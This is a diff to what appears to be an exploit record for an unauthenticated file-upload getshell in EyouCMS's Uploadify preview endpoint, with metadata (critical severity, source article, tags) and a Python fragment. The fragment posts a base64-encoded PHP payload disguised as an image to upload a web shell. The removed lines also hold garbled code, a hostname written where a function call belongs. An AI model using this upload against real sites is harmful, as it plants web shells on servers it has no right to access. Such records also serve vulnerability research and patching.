@@ -8,7 +8,7 @@
 - **severity**: critical
 - **language**: http
 - **source**: web
-- **source_url**: https://target187.example.com/developer/article/1690304
+- **source_url**: https://cloud.tencent.cn/developer/article/1690304
 - **verified_note**: 未在真实目标验证；公开复现文章 + 官方 master 源码（该接口已 exit 废弃）交叉印证。
 - **tags**: eyoucms,文件上传,getshell,前台未授权,Uploadify
 - **created_at**: 2026-10-06T12:14:04.325Z
@@ -45,7 +45,7 @@ UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like 
 
 def upload(b64, path="/example.com/api/Uploadify/preview"):
     body = ("data:image/php;base64,%s" % b64).encode()
-    r = target9.example.com(TARGET + path, data=body, verify=False, timeout=15,
+    r = requests.post(TARGET + path, data=body, verify=False, timeout=15,
                       headers={"User-Agent": UA, "Content-Type": "text/plain;charset=UTF-8"})
     return r
 
